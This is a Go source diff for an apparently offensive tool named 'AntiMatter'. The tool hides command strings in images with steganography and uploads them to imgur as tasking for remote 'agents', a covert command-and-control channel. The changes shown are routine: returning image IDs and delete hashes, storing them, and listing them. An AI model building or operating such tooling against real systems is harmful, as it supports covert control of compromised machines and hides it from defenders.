@@ -10,16 +10,16 @@ import (
 	"image/png"
 	"io/ioutil"
 	"mime/multipart"
-	//"mime/multipart"
-	//"log"
 	"net/http"
 	"net/url"
 	"os"
+	"sort"
 	"strconv"
 	"strings"
 
 	stego "github.com/auyer/steganography"
 	"github.com/fatih/color"
+	"github.com/jwangsadinata/go-multimap/slicemultimap"
 	"github.com/manifoldco/promptui"
 )
 
@@ -47,6 +47,9 @@ var albumOptions = map[string]string{"Title": "", "Client-ID": "", "AlbumID": ""
 
 // Global map for the Task module
 var taskOptions = map[string]string{"TaskingImage": "", "Title": "", "Description": "", "ClientID": ""}
+
+// Global multimap for holding several different types of variables returned from the imgur API
+var imgurItems = slicemultimap.New() // empty
 
 // createImage is a function that uses the stego lib to encode an image you define and then write it to a new image
 func createImage(command string, origPic string, newPic string) {
@@ -105,7 +108,7 @@ func createAlbum(title string, clientID string) (albumID, deleteHash interface{}
 
 }
 
-func uploadImage(imageFile string, title string, description string, clientID string) {
+func uploadImage(imageFile string, title string, description string, clientID string) (imageID, deleteHash interface{}) {
 	url := "https://api.imgur.com/3/image"
 	method := "POST"
 	var params = map[string]string{"image": imageFile, "title": title, "description": description}
@@ -133,10 +136,20 @@ func uploadImage(imageFile string, title string, description string, clientID st
 
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 	res, err := client.Do(req)
-	defer res.Body.Close()
-	body, err := ioutil.ReadAll(res.Body)
+	var result map[string]interface{}
 
-	fmt.Println(string(body))
+	json.NewDecoder(res.Body).Decode(&result)
+
+	nestedMap := result["data"]
+	newMap, _ := nestedMap.(map[string]interface{})
+
+	imageID = newMap["id"]
+	deleteHash = newMap["deletehash"]
+
+	fmt.Println(color.GreenString("[+] Tasking upload success!"))
+	fmt.Println(color.GreenString("\nImage ID is:"), imageID, "|", color.GreenString("Delete Hash is:"), deleteHash, "\n")
+
+	return imageID, deleteHash
 
 }
 
@@ -189,6 +202,7 @@ func main() {
 			fmt.Println(" Album		Create an Album for agent responses")
 			fmt.Println(" Task		Create Tasking for agent")
 			fmt.Println(" List		List images, albums, agents, and tasks")
+			fmt.Println(" Options	List out different options/modules you can choose from")
 			fmt.Println(" Exit		Exit program")
 			fmt.Println("")
 		}
@@ -321,7 +335,7 @@ func main() {
 		if strings.EqualFold(result, "Task") {
 			for {
 				reader := bufio.NewReader(os.Stdin)
-				color.Set(color.FgGreen)
+				color.Set(color.FgHiYellow)
 				fmt.Print("AntiMatter/Task > ")
 				color.Unset()
 				// Had to do this since case sensitivity is dumb in golang
@@ -377,10 +391,37 @@ func main() {
 					}
 
 				} else if strings.Contains(text, "go") {
-					uploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["Description"], taskOptions["ClientID"])
+					imageID, deletehash := uploadImage(taskOptions["TaskingImage"], taskOptions["Title"], taskOptions["Description"], taskOptions["ClientID"])
+
+					imgurItems.Put("ImageID", imageID)
+					imgurItems.Put("AlbumDeleteHash", deletehash)
 
 				} else if strings.Contains(text, "exit") {
 					break
+				} else if strings.Contains(text, "list") {
+					values := imgurItems.Values() // Grabs values in random order
+
+					// Workaround to make sure we grab values in a sorted order every time
+					tmp := make([]string, len(values))
+					count := 0
+					for _, value := range values {
+						tmp[count] = value.(string)
+						count++
+					}
+					sort.Strings(tmp)
+
+					// DeleteHash == 15 bytes long
+					// ImageID == 7 bytes long
+
+					// Check the lengths to appropriately label values
+					for _, items := range tmp {
+						if len(items) == 15 {
+							fmt.Println(color.GreenString("Delete Hash is:"), items, "\n")
+						} else if len(items) == 7 {
+							fmt.Println(color.GreenString("\nImage ID is:"), items)
+						}
+					}
+
 				}
 
 			}
